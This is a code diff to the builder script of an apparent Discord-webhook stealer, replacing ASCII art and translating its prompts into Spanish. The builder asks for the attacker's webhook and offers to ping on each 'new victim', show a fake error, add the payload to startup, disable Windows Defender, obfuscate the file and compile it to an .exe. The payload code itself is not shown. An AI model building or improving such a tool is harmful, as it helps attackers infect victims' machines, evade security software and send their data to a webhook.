@@ -10,6 +10,44 @@ from zlib import compress
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
 
+p = Fore.GREEN + Style.DIM
+r = Fore.RED + Style.BRIGHT
+
+img = fr"""{p}
+        ,n888888n,
+        .8888888888b
+        888888888888nd8P~''8g,
+        88888888888888   _  `'~\.  .n.
+        `Y888888888888. / _  |~\\ (8"8b
+    ,nnn.. 8888888b.  |  \ \m\|8888P
+    ,d8888888888888888b. \8b|.\P~ ~P8~
+    888888888888888P~~_~  `8B_|      |
+    ~888888888~'8'   d8.    ~      _/
+    ~Y8888P'   ~\ | |~|~b,__ __--~
+--~~\   ,d8888888b.\`\_/ __/~
+    \_ d88888888888b\_-~8888888bn.
+        \8888P   "Y888888888888"888888bn.
+    /~'\_"__)      "d88888888P,-~~-~888
+    /  / )   ~\     ,888888/~' /  / / 8'
+.-(  / / / |) )-----------(/ ~  / /  |---.
+______ | (   '    /_/ Mickey Mouse (__/     /   |_______
+\      |   (_(_ ( /~ for President  \___/_/'    |      /
+\     |  Let's put a mouse in the White House! |     /
+/     (________________________________________)     \
+/__________)     __--|~mb  ,g8888b.         (__________\
+        _/    8888b(.8P"~'~---__
+        /       ~~~| / ,/~~~~--, `\
+        (       ~\,_) (/         ~-_`\
+        \  -__---~._ \             ~\\
+        (           )\\              ))
+        `\          )  "-_           `|
+        \__    __/      ~-__   __--~
+            ~~"~             ~~~
+
+            Username: {os.getlogin()}
+            PC Name: {os.getenv('COMPUTERNAME')}
+            Operating System: {os.getenv('OS')}
+"""
 
 class Builder:
     def __init__(self) -> None:
@@ -18,18 +56,22 @@ class Builder:
         if not self.check():
             exit()
 
-        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
+        # Imprimimos el logo
+        print(Fore.GREEN)
+        print("\n\n\n\n\n\n\n\n" + img)
+
+        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Introduce tu WebHook: ')
         if not self.check_webhook(self.webhook):
-            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
-            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit..."))
+            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}WebHook Invalido!{Fore.RESET}")
+            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Presiona cualquier tecla para salir..."))
             sys.exit()
 
-        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your filename: ')
+        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Introduce el nombre de el archivo: ')
 
-        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping on new victim? (y/n): ')
+        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} El ping de una nueva victima? (y/n): ')
         if self.ping.lower() == 'y':
             self.ping = True
-            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type? (here/everyone): ').lower()
+            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Tipo ping? (here/everyone): ').lower()
             if self.pingtype not in ["here", "everyone"]:
                 # default to @here if invalid ping type.
                 self.pingtype == "here"
@@ -37,30 +79,30 @@ class Builder:
             self.ping = False
             self.pingtype = "none"
 
-        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add a fake error? (y/n): ')
+        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Añadir un erro falso? (y/n): ')
         if self.error.lower() == 'y':
             self.error = True
         else:
             self.error = False
 
-        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add file to startup? (y/n): ')
+        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Añadir payload al arrancar el sistema? (y/n): ')
         if self.startup.lower() == 'y':
             self.startup = True
         else:
             self.startup = False
 
-        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Disable windows defender? (y/n): ')
+        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Quieres desactivar Windows Defender? (y/n): ')
         if self.defender.lower() == 'y':
             self.defender = True
         else:
             self.defender = False
 
-        self.obfuscation = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
+        self.obfuscation = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas ofuscar el archivo? (y/n): ')
 
-        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
+        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas compliar el .exe? (y/n): ')
 
         if self.compy == 'y':
-            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to add an icon to the .exe (y/n): ')
+            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Quieres añadir un icono al .exe (y/n): ')
             if self.icon == 'y':
                 self.icon_exe()
             else:
@@ -70,7 +112,7 @@ class Builder:
 
         self.mk_file(self.filename, self.webhook)
 
-        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}')
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Archivo creado satisfactoriamente!{Fore.RESET}')
 
         self.cleanup(self.filename)
         self.renamefile(self.filename)
@@ -81,76 +123,55 @@ class Builder:
             pass
             
         run = input(
-            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? [y/n]: ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Deseas testear el archivo? [y/n]: ')
         if run.lower() == 'y':
             self.run(self.filename)
 
-        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
+        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Aprienta enter para salir...{Fore.RESET}')
         sys.exit()
 
     def loading(self):
-        p = Fore.MAGENTA + Style.DIM
+        p = Fore.GREEN + Style.DIM
         r = Fore.RED + Style.BRIGHT
 
         img = fr"""{p}
-                                                                ...                                                                    ...
-                                                              ,(#(*.                                                                 ,/%#/.
-                                                            ./#%%%(,                                                                 /#%%%(*
-                                                           ./#%%%%%/,                                                              .*#%%%%%(,
-                                                           *#%%%%%&%(,.             ..,,,*****/////////////****,,,...             ,/%%%%%%%#/.
-                                                           *(%%%%%%%%%(*.  .,*/(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(*,..  ,/#%%%%%%%%#/.
-                                                           ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%(*.
-                                                           .*#%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/,.
-                                                        .*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/.
-                                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                                     .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%(.
-                                                    .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                                   *#%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(.
-                                                 .(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*
-                                                ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*.
-                                               ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                              ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*
-                                             ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                            .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,
-                                           ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(*
-                                           *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
-                                          *(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                         .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,
-                                        .,#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}######{p}%%%%%%%%%%%%%%%%%%%%%%%%%/.
-                                        ,/#%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###########{p}%%%%%%%%%%%%%%%%%%%%%%%%%(,
-                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%#/
-                                        *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#####################{p}%%%%%%%%%%%%%%%%%%%{r}######################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%(.
-                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}###################{p}%%%%%%%%%%%%%%%%%%%%%{r}####################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%#.
-                                       ,/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#################{p}%%%%%%%%%%%%%%%%%%%%%%%{r}##################{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.
-                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}#############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%{r}############{p}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*.
-                                       ,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%#,.
-                                       ./%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%%%%%%%%%#,.
-                                        *#%%%%%%%%%%%%%%%%%%%%%%%%%(*....,*(#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#(/,....,/#%%%%%%%%%%%%%%%%%%%%%%%%#/.
-                                          .*/#%%%%%%%%%%%%%%%%%%%%%%%%#(*,.   .,,*//((###%%%%%%%%%%%%%%%%%%%%%%%##((//*,,.   .,*/(#%%%%%%%%%%%%%%%%%%%%%%%#(/,.
-                                              .*(%%%%%%%%%%%%%%%%%%%%%%%%%%%(.              ...,,,,***,,,...              .*#%%%%%%%%%%%%%%%%%%%%%%%%%%#/,
-                                                  .,/(#%%%%%%%%%%%%%%%%%%%%/,                                              ./#%%%%%%%%%%%%%%%%%%%%#/*,.
-                                                       .*/(#%%%%%%%%%%%%%#/.                                                 *(%%%%%%%%%%%%%##(*,.
-                                                            ..*/(#%%%%%%(,                                                    ./#&%%%%%#(*,..
-                                                                  .,***,                                                        ,*/*,..
-
+              ,n888888n,
+             .8888888888b
+             888888888888nd8P~''8g,
+             88888888888888   _  `'~\.  .n.
+             `Y888888888888. / _  |~\\ (8"8b
+            ,nnn.. 8888888b.  |  \ \m\|8888P
+          ,d8888888888888888b. \8b|.\P~ ~P8~
+          888888888888888P~~_~  `8B_|      |
+          ~888888888~'8'   d8.    ~      _/
+           ~Y8888P'   ~\ | |~|~b,__ __--~
+       --~~\   ,d8888888b.\`\_/ __/~
+            \_ d88888888888b\_-~8888888bn.
+              \8888P   "Y888888888888"888888bn.
+           /~'\_"__)      "d88888888P,-~~-~888
+          /  / )   ~\     ,888888/~' /  / / 8'
+       .-(  / / / |) )-----------(/ ~  / /  |---.
+______ | (   '    /_/ Mickey Mouse (__/     /   |_______
+\      |   (_(_ ( /~ for President  \___/_/'    |      /
+ \     |  Let's put a mouse in the White House! |     /
+ /     (________________________________________)     \
+/__________)     __--|~mb  ,g8888b.         (__________\
+               _/    8888b(.8P"~'~---__
+              /       ~~~| / ,/~~~~--, `\
+             (       ~\,_) (/         ~-_`\
+              \  -__---~._ \             ~\\
+              (           )\\              ))
+              `\          )  "-_           `|
+                \__    __/      ~-__   __--~
+                   ~~"~             ~~~
 
                 Username: {os.getlogin()}
                  PC Name: {os.getenv('COMPUTERNAME')}
         Operating System: {os.getenv('OS')}
 |"""
 
-        with alive_bar(40) as bar:
-            for _ in range(40):
-                print(img)
-                time.sleep(random.randint(1, 3) / 40)
-                os.system('cls')
-                bar()
-
-            os.system('cls')
-
+        print(img)
+        time.sleep(random.randint(1, 3) / 40)
         print(Style.RESET_ALL)
 
     def check_webhook(self, webhook):
